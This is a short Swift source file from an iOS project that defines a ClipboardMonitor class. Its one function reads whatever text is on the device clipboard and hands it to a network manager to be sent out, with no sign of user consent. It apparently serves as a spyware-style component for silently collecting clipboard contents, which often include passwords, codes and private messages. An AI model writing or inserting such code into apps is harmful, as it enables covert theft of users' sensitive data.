//
//  ClipboardMonitor.swift
//  ios-angry-fog
//
//  Created by Mariia Glushenkova on 28.4.2025.
//


import UIKit

class ClipboardMonitor {
    static func checkClipboardAndSend() {
        if let clipboardText = UIPasteboard.general.string {
            NetworkManager.sendData(data: "Clipboard: \(clipboardText)")
        }
    }
}